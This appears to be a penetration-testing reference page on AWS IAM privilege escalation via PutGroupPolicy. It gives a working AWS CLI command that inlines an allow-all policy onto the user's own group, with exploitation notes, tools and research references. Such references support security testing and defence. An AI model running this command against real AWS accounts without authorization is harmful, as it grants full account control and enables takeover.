---
title: "PutGroupPolicy: inline an allow-all policy onto your group"
description: "iam:PutGroupPolicy to inline an allow-all policy onto a group you belong to."
keywords:
  - PutGroupPolicy
  - inline policy
  - group
  - allow-all
  - policy
---

# PutGroupPolicy

`iam:PutGroupPolicy` inlines a policy onto a group. Every member inherits it, so inlining an allow-all statement onto a group that contains your user promotes you.

## Inline onto your group

```bash
aws iam put-group-policy --group-name <your-group> --policy-name esc \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

## Exploitation notes

- Verify membership with `list-groups-for-user` first.
- Inline group policies are read with `list-group-policies` / `get-group-policy`, not the attached-policy calls.

## Tools

- **AWS CLI** (`iam put-group-policy`).
- **Pacu** (`iam__privesc_scan`).

## References

- [Rhino Security Labs: AWS privilege escalation (PutGroupPolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
